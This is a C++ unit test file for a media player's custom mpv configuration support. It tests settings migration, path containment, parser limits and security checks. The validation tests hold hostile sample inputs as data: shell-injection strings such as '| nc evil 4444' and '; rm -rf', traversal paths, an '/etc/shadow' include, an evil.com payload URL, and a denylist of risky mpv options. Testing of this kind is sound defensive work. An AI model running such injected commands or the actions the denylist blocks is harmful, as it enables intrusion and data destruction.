#pragma once

#include "../support/TestFramework.h"
#include "../../src/Common.h"
#include "../../src/Settings.h"
#include "../../src/MpvPlayer.h"
#include "../../src/Json.h"
#include <windows.h>
#include <string>
#include <vector>

namespace Aperture::Test {

TEST_CASE(CustomMpvConfig, SettingsSchemaMigrationAndDefaults) {
    // Stage 10 JSON without custom MPV config fields
    std::string v10Json = "{\n"
        "  \"schemaVersion\": 10,\n"
        "  \"themePreset\": \"default\",\n"
        "  \"volume\": 0.90,\n"
        "  \"customExtensionPlugin\": \"SamplePlugin_v1\"\n"
        "}";

    JsonValue root;
    TEST_ASSERT(JsonValue::parse(v10Json, root));
    TEST_ASSERT_EQ(root.get("schemaVersion").as_int(), 10);

    // Migrate 10 -> 11
    TEST_ASSERT(Settings::MigrateSchema(root, 10, 11));
    TEST_ASSERT_EQ(root.get("schemaVersion").as_int(), 11);

    // Verify newly added custom MPV configuration defaults
    TEST_ASSERT_EQ(root.get("customMpvConfigEnabled").as_bool(), false);
    TEST_ASSERT_EQ(root.get("customMpvConfigPath").as_string(), "mpv.conf");

    // Verify unknown extension properties are preserved
    TEST_ASSERT_EQ(root.get("customExtensionPlugin").as_string(), "SamplePlugin_v1");

    // Test Settings struct default values
    Settings s;
    s.ResetToDefaults();
    TEST_ASSERT_EQ(s.customMpvConfigEnabled, false);
    TEST_ASSERT_EQ(s.customMpvConfigPath, std::string("mpv.conf"));
}

TEST_CASE(CustomMpvConfig, PathContainmentAndNormalization) {
    const std::wstring testExeDir = L"C:\\ApertureApp";

    // 1. Valid root-contained relative paths
    TEST_ASSERT(Settings::IsRootContainedMpvConfigPath("mpv.conf", testExeDir));
    TEST_ASSERT(Settings::IsRootContainedMpvConfigPath("config/mpv.conf", testExeDir));
    TEST_ASSERT(Settings::IsRootContainedMpvConfigPath("sub\\custom.conf", testExeDir));
    TEST_ASSERT_EQ(Settings::NormalizeMpvConfigPath("mpv.conf", testExeDir), std::string("mpv.conf"));
    TEST_ASSERT_EQ(Settings::NormalizeMpvConfigPath("config/mpv.conf", testExeDir), std::string("config\\mpv.conf"));

    // 2. Reject path traversal escaping root
    TEST_ASSERT(!Settings::IsRootContainedMpvConfigPath("../outside.conf", testExeDir));
    TEST_ASSERT(!Settings::IsRootContainedMpvConfigPath("..\\..\\windows\\system32\\calc.exe", testExeDir));
    TEST_ASSERT(!Settings::IsRootContainedMpvConfigPath("config/../../escaped.conf", testExeDir));

    // Normalization falls back safely to default "mpv.conf"
    TEST_ASSERT_EQ(Settings::NormalizeMpvConfigPath("../outside.conf", testExeDir), std::string("mpv.conf"));
    TEST_ASSERT_EQ(Settings::NormalizeMpvConfigPath("..\\escaped.conf", testExeDir), std::string("mpv.conf"));

    // 3. Reject invalid characters and empty paths
    TEST_ASSERT(!Settings::IsRootContainedMpvConfigPath("", testExeDir));
    TEST_ASSERT(!Settings::IsRootContainedMpvConfigPath("mpv|evil.conf", testExeDir));
    TEST_ASSERT(!Settings::IsRootContainedMpvConfigPath("mpv<bad>.conf", testExeDir));
    TEST_ASSERT_EQ(Settings::NormalizeMpvConfigPath("", testExeDir), std::string("mpv.conf"));

    // 4. ResolveMpvConfigPath produces root-contained absolute path
    std::wstring resolved = Settings::ResolveMpvConfigPath("mpv.conf", testExeDir);
    TEST_ASSERT_EQ(resolved, std::wstring(L"C:\\ApertureApp\\mpv.conf"));
}

TEST_CASE(CustomMpvConfig, ParserSafeOptionsAndFormats) {
    std::string configContent =
        "# Comment line\n"
        "; Semicolon comment\n"
        "\n"
        "deband=yes\n"
        "--deband-iterations=4\n"
        "deband-threshold: 48\n"
        "scale spline36\n"
        "cscale=\"ewa_lanczos\"\n"
        "dscale='mitchell'\n"
        "interpolation\n"
        "no-keepaspect\n"
        "volume-max = 150\n";

    CustomMpvParseResult res = MpvPlayer::ParseCustomMpvConfig(configContent);
    TEST_ASSERT(res.success);
    TEST_ASSERT_EQ(res.errors.size(), 0);
    TEST_ASSERT_EQ(res.options.size(), 9);

    TEST_ASSERT_EQ(res.options[0].name, std::string("deband"));
    TEST_ASSERT_EQ(res.options[0].value, std::string("yes"));

    TEST_ASSERT_EQ(res.options[1].name, std::string("deband-iterations"));
    TEST_ASSERT_EQ(res.options[1].value, std::string("4"));

    TEST_ASSERT_EQ(res.options[2].name, std::string("deband-threshold"));
    TEST_ASSERT_EQ(res.options[2].value, std::string("48"));

    TEST_ASSERT_EQ(res.options[3].name, std::string("scale"));
    TEST_ASSERT_EQ(res.options[3].value, std::string("spline36"));

    TEST_ASSERT_EQ(res.options[4].name, std::string("cscale"));
    TEST_ASSERT_EQ(res.options[4].value, std::string("ewa_lanczos"));

    TEST_ASSERT_EQ(res.options[5].name, std::string("dscale"));
    TEST_ASSERT_EQ(res.options[5].value, std::string("mitchell"));

    TEST_ASSERT_EQ(res.options[6].name, std::string("interpolation"));
    TEST_ASSERT_EQ(res.options[6].value, std::string("yes"));

    TEST_ASSERT_EQ(res.options[7].name, std::string("no-keepaspect"));
    TEST_ASSERT_EQ(res.options[7].value, std::string("yes"));

    TEST_ASSERT_EQ(res.options[8].name, std::string("volume-max"));
    TEST_ASSERT_EQ(res.options[8].value, std::string("150"));
}

TEST_CASE(CustomMpvConfig, ParserBoundsEnforcement) {
    // 1. Oversized file (> 64 KiB)
    std::string largeContent(65 * 1024, 'A');
    CustomMpvParseResult largeRes = MpvPlayer::ParseCustomMpvConfig(largeContent);
    TEST_ASSERT(!largeRes.success);
    TEST_ASSERT(largeRes.errors.size() > 0);

    // 2. Line length limit (> 1024 chars)
    std::string longLine = "scale=" + std::string(1100, 'x') + "\n";
    longLine += "deband=yes\n";
    CustomMpvParseResult lineRes = MpvPlayer::ParseCustomMpvConfig(longLine);
    TEST_ASSERT_EQ(lineRes.options.size(), 1);
    TEST_ASSERT_EQ(lineRes.options[0].name, std::string("deband"));
    TEST_ASSERT(lineRes.warnings.size() > 0);

    // 3. Option count limit (max 128)
    std::string manyOptions;
    for (int i = 0; i < 200; ++i) {
        manyOptions += "gamma=" + std::to_string(i) + "\n";
    }
    CustomMpvParseResult countRes = MpvPlayer::ParseCustomMpvConfig(manyOptions);
    TEST_ASSERT(countRes.success);
    TEST_ASSERT_EQ(countRes.options.size(), 128);
    TEST_ASSERT(countRes.warnings.size() > 0);
}

TEST_CASE(CustomMpvConfig, SecurityDenylistRejection) {
    // Test unsafe script, IPC, config inclusion, storage, network, and host hijacking options
    const std::vector<std::string> unsafeOptions = {
        "script", "scripts", "script-opts", "script-opts-append", "script-opts-add", "script-opts-remove",
        "lua", "js", "javascript", "load-scripts", "ipc", "input-ipc-server", "input-ipc-client",
        "input-test", "input-bindings", "input-conf", "input-terminal", "terminal", "osc",
        "include", "config", "config-dir", "load-config", "use-filedir-conf", "reset-on-next-file", "profile",
        "log-file", "dump-stats", "record-file", "stream-dump", "o", "of", "ovc", "ovac", "ofopts",
        "audio-file", "sub-file", "external-file", "screenshot-directory", "screenshot-template",
        "gpu-shader-cache-dir", "sub-fonts-dir", "fonts-dir",
        "http-proxy", "ytdl", "ytdl-format", "ytdl-raw-options", "network-timeout",
        "tls-ca-file", "tls-cert-file", "tls-key-file", "tls-verify", "cookies", "cookies-file",
        "wid", "force-window-position", "input-default-bindings", "input-vo-keyboard", "input-media-keys", "dll"
    };

    for (const auto& opt : unsafeOptions) {
        std::string reason;
        TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe(opt, "value", &reason));
        TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("--" + opt, "value", &reason));
        TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("no-" + opt, "value", &reason));
    }

    // Test rejection in parser
    std::string unsafeConfig =
        "deband=yes\n"
        "script=C:\\evil\\hack.lua\n"
        "input-ipc-server=\\\\.\\pipe\\mpv_ipc\n"
        "include=/etc/shadow\n"
        "http-proxy=http://127.0.0.1:8080\n"
        "scale=spline36\n";

    CustomMpvParseResult res = MpvPlayer::ParseCustomMpvConfig(unsafeConfig);
    TEST_ASSERT(res.success);
    // Only deband and scale must remain
    TEST_ASSERT_EQ(res.options.size(), 2);
    TEST_ASSERT_EQ(res.options[0].name, std::string("deband"));
    TEST_ASSERT_EQ(res.options[1].name, std::string("scale"));
    TEST_ASSERT_EQ(res.warnings.size(), 4);
}

TEST_CASE(CustomMpvConfig, SecurityValueValidation) {
    std::string reason;

    // Reject command injection characters
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "spline36`whoami`", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "spline36$(calc)", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "spline36; rm -rf", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "spline36 | nc evil 4444", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "spline36 & calc.exe", &reason));

    // Reject path traversal in values
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "../other/file", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "..\\other\\file", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "http://evil.com/payload", &reason));
    TEST_ASSERT(!MpvPlayer::IsCustomMpvOptionSafe("scale", "C:\\Windows\\system32", &reason));

    // Valid values pass
    TEST_ASSERT(MpvPlayer::IsCustomMpvOptionSafe("scale", "spline36", &reason));
    TEST_ASSERT(MpvPlayer::IsCustomMpvOptionSafe("deband-iterations", "4", &reason));
    TEST_ASSERT(MpvPlayer::IsCustomMpvOptionSafe("contrast", "-10", &reason));
}

TEST_CASE(CustomMpvConfig, LastKnownGoodRetentionAndRecovery) {
    std::wstring testDir = GetDataDir() + L"\\test_mpv_config";
    SHCreateDirectoryExW(NULL, testDir.c_str(), NULL);
    std::wstring confPath = testDir + L"\\mpv.conf";
    std::wstring lkgPath = Settings::GetMpvConfigLastKnownGoodPath(confPath);

    // 1. Reset to default creates safe template
    StorageStatus resetStatus = Settings::ResetMpvConfigToDefault(confPath);
    TEST_ASSERT(resetStatus.is_ok());
    TEST_ASSERT(FileExists(confPath));

    std::string defaultContent;
    TEST_ASSERT(ReadTextFile(confPath, defaultContent).is_ok());
    TEST_ASSERT(defaultContent.find("Aperture Custom MPV Configuration") != std::string::npos);

    // 2. Save Last Known Good copy
    std::string goodContent = "deband=yes\nscale=spline36\n";
    StorageStatus saveLkgStatus = Settings::SaveMpvConfigLastKnownGood(confPath, goodContent);
    TEST_ASSERT(saveLkgStatus.is_ok());
    TEST_ASSERT(FileExists(lkgPath));

    // 3. Load Last Known Good copy
    std::string loadedLkg;
    StorageStatus loadLkgStatus = Settings::LoadMpvConfigLastKnownGood(confPath, loadedLkg);
    TEST_ASSERT(loadLkgStatus.is_ok());
    TEST_ASSERT_EQ(loadedLkg, goodContent);

    // 4. Overwrite conf with bad data, then Revert to LKG
    std::string badContent = "bad_broken_syntax\n";
    TEST_ASSERT(AtomicWriteTextFile(confPath, badContent).is_ok());

    StorageStatus revertStatus = Settings::RevertMpvConfigToLastKnownGood(confPath);
    TEST_ASSERT(revertStatus.is_ok());

    std::string restoredContent;
    TEST_ASSERT(ReadTextFile(confPath, restoredContent).is_ok());
    TEST_ASSERT_EQ(restoredContent, goodContent);

    // Clean up test directory
    DeleteFileW(confPath.c_str());
    DeleteFileW(lkgPath.c_str());
    std::wstring bakPath = testDir + L"\\backups\\mpv.conf.bak.1";
    DeleteFileW(bakPath.c_str());
    RemoveDirectoryW((testDir + L"\\backups").c_str());
    RemoveDirectoryW(testDir.c_str());
}

TEST_CASE(CustomMpvConfig, MpvPlayerRuntimeApplyAndRecovery) {
    MpvPlayer player;
    player.SetCustomMpvConfigEnabled(true);
    player.SetCustomMpvConfigPath("mpv.conf");

    TEST_ASSERT(player.IsCustomMpvConfigEnabled());
    TEST_ASSERT_EQ(player.GetCustomMpvConfigPath(), std::string("mpv.conf"));

    // When mpv is uninitialized, applying options safely returns without crashing
    std::vector<CustomMpvOption> opts = {
        { "deband", "yes", 1 },
        { "scale", "spline36", 2 }
    };
    CustomMpvApplyResult uninitRes = player.ApplyCustomMpvOptions(opts);
    TEST_ASSERT(!uninitRes.success);
    TEST_ASSERT(uninitRes.errorMessage.find("not initialized") != std::string::npos);

    // Test LoadAndApplyCustomMpvConfig handles missing or empty paths gracefully
    std::wstring tempTestDir = GetDataDir() + L"\\test_mpv_player_recovery";
    SHCreateDirectoryExW(NULL, tempTestDir.c_str(), NULL);
    std::wstring testConf = tempTestDir + L"\\mpv.conf";

    // Create a valid config file and test LoadAndApply
    Settings::ResetMpvConfigToDefault(testConf);
    CustomMpvApplyResult loadRes = player.LoadAndApplyCustomMpvConfig(testConf);
    // Since mpv is uninitialized, it handles it safely and preserves player stability
    TEST_ASSERT_EQ(player.GetLastCustomMpvResult().success, loadRes.success);

    // Clean up
    DeleteFileW(testConf.c_str());
    DeleteFileW(Settings::GetMpvConfigLastKnownGoodPath(testConf).c_str());
    RemoveDirectoryW(tempTestDir.c_str());
}

} // namespace Aperture::Test
